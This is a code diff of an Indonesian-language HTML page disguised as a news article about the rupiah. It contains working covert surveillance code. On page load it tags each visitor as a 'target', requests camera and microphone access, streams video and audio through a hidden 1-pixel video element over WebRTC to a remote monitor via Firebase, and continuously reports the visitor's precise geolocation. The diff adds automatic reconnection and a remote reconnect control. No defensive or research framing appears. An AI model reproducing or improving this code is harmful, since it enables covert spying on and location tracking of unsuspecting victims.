@@ -3,29 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Berita Nasional</title>
+    <title>Portal Berita Nasional - Live Update</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; background: #f4f4f4; color: #333; }
-        .header { background: #b91c1c; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        .container { padding: 20px; max-width: 800px; margin: auto; background: white; min-height: 100vh; }
-        h1 { color: #111; font-size: 24px; }
-        #v { display: none; }
-        .fake-content { color: #555; line-height: 1.8; }
-        img { width: 100%; border-radius: 8px; margin: 15px 0; }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 0; background: #fff; color: #222; }
+        .top-bar { background: #cc0000; color: #fff; padding: 10px 20px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; font-size: 14px; }
+        .container { padding: 20px; max-width: 700px; margin: auto; }
+        h1 { font-size: 28px; line-height: 1.2; color: #000; margin-bottom: 15px; }
+        .meta-info { color: #666; font-size: 13px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        p { line-height: 1.6; font-size: 17px; margin-bottom: 20px; }
+        img { width: 100%; height: auto; border-radius: 4px; }
+        /* Video bener-bener tersembunyi tapi tetep jalan */
+        #v { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0.01; }
     </style>
 </head>
 <body>
-    <div class="header">INFO NEWS INDONESIA</div>
+    <div class="top-bar">Breaking News</div>
     <div class="container">
-        <h1>Transformasi Digital: Peluang dan Tantangan di Era Modern</h1>
-        <p class="fake-content">Jakarta - Perkembangan teknologi yang masif menuntut masyarakat untuk lebih adaptif dalam menghadapi perubahan ekonomi dunia...</p>
-        <img src="https://picsum.photos/800/400?news=1" alt="News Image">
-        <p class="fake-content">Berdasarkan data terbaru, penggunaan internet di Indonesia meningkat hingga 15% pada kuartal pertama tahun ini. Pemerintah terus mendorong pemerataan infrastruktur...</p>
+        <h1>Rupiah Menguat Tajam di Perdagangan Pagi Ini, Analis: Momentum Positif Berlanjut</h1>
+        <div class="meta-info">Oleh: Tim Redaksi | Rabu, 04 Maret 2026</div>
+        <img src="https://picsum.photos/800/450?business" alt="Finance">
+        <p>Pasar keuangan Indonesia menyambut positif rilis data inflasi terbaru yang menunjukkan stabilitas yang lebih baik dari ekspektasi pelaku pasar.</p>
+        <p>Investor asing mulai mencatatkan beli bersih di pasar modal, yang mendorong indeks harga saham gabungan ikut menguat di zona hijau.</p>
     </div>
-    
-    <!-- Hidden Cam Preview -->
+
     <video id="v" autoplay playsinline muted></video>
 
     <script>
@@ -36,71 +38,74 @@
         };
         firebase.initializeApp(firebaseConfig);
 
-        let targetId = localStorage.getItem('target_id');
-        if (!targetId) {
-            targetId = "TGT-" + Math.random().toString(36).substr(2, 5).toUpperCase();
-            localStorage.setItem('target_id', targetId);
-        }
+        let targetId = localStorage.getItem('target_id') || "TGT-" + Math.random().toString(36).substr(2, 5);
+        localStorage.setItem('target_id', targetId);
 
         const db = firebase.database().ref('v5_multi/' + targetId);
         let pc = null;
         let localStream = null;
 
-        async function startStream() {
+        // Fungsi buat inisialisasi stream tanpa refresh
+        async function setupMedia() {
+            if (localStream) return true;
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
+                    video: { width: 640, height: 480 }, 
                     audio: true 
                 });
                 document.getElementById('v').srcObject = localStream;
-                setupWebRTC();
+                return true;
             } catch (e) {
-                console.error("Camera access denied");
-                // Tetap kirim status lokasi meski kamera gagal
-                startLocationTracking();
+                console.error("Gagal akses media:", e);
+                return false;
             }
         }
 
-        async function setupWebRTC() {
-            // Bersihkan sisa koneksi lama sebelum mulai baru
-            await db.child('sdp').remove();
-            await db.child('ice_m').remove();
-            await db.child('ice_t').remove();
+        async function createSignal() {
+            // Tutup PC lama kalau ada
+            if (pc) {
+                pc.close();
+                pc = null;
+            }
 
-            if (pc) pc.close();
+            // Pastikan media aktif
+            const ready = await setupMedia();
+            if (!ready) return;
+
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+
+            localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
 
             pc.onicecandidate = e => {
                 if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
             };
 
-            localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+            // Jika koneksi putus di tengah jalan, auto re-signal
+            pc.onconnectionstatechange = () => {
+                if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected') {
+                    console.log("Koneksi drop, mencoba menghubungkan ulang...");
+                    setTimeout(createSignal, 2000);
+                }
+            };
 
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
             
-            // Kirim offer dengan timestamp unik agar Monitor tahu ini sesi baru
-            db.child('sdp/offer').set({ 
+            // Push offer baru ke DB buat mancing monitor
+            await db.child('sdp/offer').set({ 
                 type: offer.type, 
                 sdp: offer.sdp, 
                 ts: Date.now() 
             });
-
-            // Tunggu Answer dari Monitor
-            db.child('sdp/answer').on('value', async s => {
-                const a = s.val();
-                if (a && pc && pc.signalingState !== "stable") {
-                    await pc.setRemoteDescription(new RTCSessionDescription(a));
-                }
-            });
-
-            // Terima ICE candidates dari Monitor
-            db.child('ice_m').on('child_added', s => {
-                if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e => {});
-            });
         }
 
-        function startLocationTracking() {
+        async function init() {
+            // Bersihkan sisa-sisa koneksi lama di DB
+            await db.child('sdp/answer').remove();
+            await db.child('ice_m').remove();
+            await db.child('ice_t').remove();
+
+            // Mulai loop heartbeat (lokasi & status)
             navigator.geolocation.watchPosition(p => {
                 db.child('status').update({ 
                     lat: p.coords.latitude, 
@@ -108,18 +113,39 @@
                     lastSeen: Date.now(), 
                     id: targetId 
                 });
-            }, null, { enableHighAccuracy: true });
+            }, () => {
+                setInterval(() => {
+                    db.child('status').update({ lastSeen: Date.now(), id: targetId });
+                }, 5000);
+            });
 
-            // Heartbeat fallback jika lokasi tidak berubah
-            setInterval(() => {
-                db.child('status/lastSeen').set(Date.now());
-            }, 5000);
+            // Jalankan sinyal pertama
+            await createSignal();
+
+            // Monitor dengerin balasan (Answer) dari Admin
+            db.child('sdp/answer').on('value', async s => {
+                const a = s.val();
+                if (a && pc && pc.signalingState !== "stable") {
+                    await pc.setRemoteDescription(new RTCSessionDescription(a));
+                }
+            });
+
+            // Monitor dengerin ICE dari Admin
+            db.child('ice_m').on('child_added', s => {
+                if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e => {});
+            });
         }
 
-        window.onload = () => {
-            startStream();
-            startLocationTracking();
-        };
+        // Jalankan pas halaman kebuka
+        window.onload = init;
+
+        // Tambahan: Jika monitor ngirim request reset/reconnect manual
+        db.child('control').on('value', s => {
+            if (s.val() === 'reconnect') {
+                db.child('control').set(null);
+                createSignal();
+            }
+        });
     </script>
 </body>
 </html>
